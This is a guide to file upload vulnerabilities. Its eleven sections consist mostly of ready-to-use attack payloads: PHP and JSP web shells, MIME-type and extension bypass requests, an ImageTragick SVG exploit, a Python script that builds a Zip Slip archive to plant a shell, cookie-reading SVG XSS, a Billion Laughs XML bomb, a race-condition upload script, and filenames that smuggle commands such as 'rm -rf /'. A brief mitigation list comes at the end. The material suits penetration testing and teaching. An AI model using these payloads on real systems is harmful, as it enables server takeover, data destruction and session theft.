📁 File Upload Vulnerabilities

Complete guide to all file upload vulnerabilities - from basic unrestricted upload to advanced bypass techniques.

📌 1. Unrestricted File Upload

Description: The application allows uploading any file type without any validation. Attackers can upload malicious files (PHP, JSP, ASPX, etc.) to execute code on the server.

Impact: Complete server compromise, remote code execution, data theft

# Test Payloads
shell.php
shell.jsp
shell.aspx
shell.phtml
shell.php5
shell.php7
<?php system($_GET['cmd']); ?>   # PHP webshell
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>   # JSP webshell

📌 2. MIME Type Bypass

Description: The server checks only the Content-Type header. Attackers can modify the MIME type to bypass validation.

Bypass Technique: Change Content-Type to allowed types like image/jpeg, image/png, application/pdf

# Intercept request and change
Content-Type: application/x-php
to
Content-Type: image/jpeg

# Using Burp Suite or curl
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

📌 3. Extension Blacklist Bypass

Description: The server blocks specific extensions but misses others. Attackers use alternative extensions that still execute.

Common Bypass Extensions: .php3, .php4, .php5, .phtml, .phar, .inc, .module

# Alternative extensions that execute
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
shell.php.jpg  # If Apache misconfigured

📌 4. Double Extension Attack

Description: Using double extensions like .jpg.php to bypass extension checks while maintaining execution capability.

Common Patterns: file.jpg.php, file.png.php, file.gif.php5

# Double extension payloads
shell.jpg.php
shell.png.php5
shell.gif.phtml
shell.jpeg.php7
shell.bmp.php3

📌 5. Null Byte Injection

Description: Using null byte (%00) to terminate string prematurely, tricking the server about file extension.

Vulnerable in: Older PHP versions (<5.3.4), C-based file operations

# Null byte payload
shell.php%00.jpg
shell.php%00.png
shell.php%00.gif

# URL encoded
shell.php%00.jpg
shell.php%252E%252E

📌 6. ImageTragick (CVE-2016-3714)

Description: ImageMagick vulnerability allowing remote code execution via specially crafted image files.

Affected Versions: ImageMagick < 7.0.1-1, < 6.9.3-10

# Malicious SVG payload
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" 
  xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="|id" width="0" height="0"/>
</svg>

📌 7. Zip Slip (Path Traversal in ZIP)

Description: Malicious ZIP files containing filenames with ../ sequences can write files outside the intended directory.

Impact: Arbitrary file write, code execution, configuration overwrite

# Create malicious ZIP
python3 -c '
import zipfile
zf = zipfile.ZipFile("malicious.zip", "w")
zf.writestr("../../../../var/www/html/shell.php", "<?php system($_GET[cmd]); ?>")
zf.close()'

📌 8. SVG XSS via Upload

Description: SVG files can contain JavaScript that executes when rendered in browser.

Impact: Stored XSS, session hijacking, data theft

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="javascript:alert(1)"/>
</svg>

📌 9. XML Bomb via Upload

Description: Uploading malicious XML files to cause Denial of Service via entity expansion (Billion Laughs attack).

Impact: Denial of Service, memory exhaustion, server crash

<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>

📌 10. Race Condition on File Upload

Description: Exploiting timing between file save and validation checks to execute malicious files before deletion.

Impact: Remote code execution, bypassing validation

# Race condition exploit using Python
import requests, threading

def upload_file():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('https://target.com/upload', files=files)

def access_shell():
    while True:
        r = requests.get('https://target.com/uploads/shell.php')
        if r.status_code == 200:
            print("Shell accessible!")
            break

threading.Thread(target=upload_file).start()
threading.Thread(target=access_shell).start()

📌 11. File Name Injection

Description: Injecting malicious content via file name that gets reflected in responses or logs.

Impact: XSS, log injection, command injection

# XSS via filename
<script>alert(1)</script>.jpg
.png

# Command injection via filename
; rm -rf / ;.jpg
| whoami .png
$(id).gif

🛡️ Mitigation (All File Upload Vulnerabilities)

✅ Allowlist Extensions: Only allow safe extensions (jpg, png, gif, pdf, txt)
✅ Validate MIME Type: Check actual file content, not just Content-Type header
✅ Rename Uploaded Files: Use random names, never trust user-provided filenames
✅ Store Files Outside Webroot: Prevent direct access to uploaded files
✅ Scan for Malware: Use ClamAV or similar antivirus
✅ Set Proper Permissions: Disable execution in upload directories
✅ Image Re-encoding: Re-encode images to remove malicious content
✅ Update Libraries: Keep ImageMagick, GD, and other libraries updated
